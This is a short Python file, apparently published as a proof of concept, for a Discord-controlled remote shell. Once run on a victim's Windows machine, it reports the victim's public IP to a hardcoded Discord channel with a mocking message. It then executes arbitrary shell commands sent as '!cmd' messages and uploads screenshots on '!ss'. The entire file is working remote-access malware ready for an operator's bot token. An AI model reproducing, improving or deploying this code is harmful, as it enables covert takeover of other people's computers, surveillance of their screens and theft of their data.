#Discord Remote Shell Tool PoC
#Coded by UDIA
#https://github.com/UDIA-GOD/Discord-Remote-Shell-Tool

import discord
import requests
import os
import sys
import numpy as np
import cv2
import pyautogui
import PIL

class MyClient(discord.Client):
    async def on_ready(self):
        ip = requests.get('https://api.ipify.org/')
        channel = client.get_channel(1067247883620995136)
        await channel.send('``' + ip.text + ' opened ur shit lol``')

    async def on_message(self, message):
        if message.author.id == self.user.id:
            return

        if message.content.startswith("!cmd "):
            command = message.content.split(" ")
            l = ""
            for x in command:
                if x!="!cmd":
                    l += x + " "
            await message.reply("Executed ``"+l+"``", mention_author=True)
            os.system('cmd /C '+l)

        if message.content.startswith("!ss"):
            image = pyautogui.screenshot()
            image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
            cv2.imwrite("image1.png", image)
            with open("image1.png", "rb") as fh:
                f = discord.File(fh, filename="image1.png")
            await message.reply("Executed ss", mention_author=True, file=f)
            fh.close()
            os.remove("image1.png")


intents = discord.Intents.default()
intents.message_content = True

client = MyClient(intents=intents)
client.run('paste ur token here')
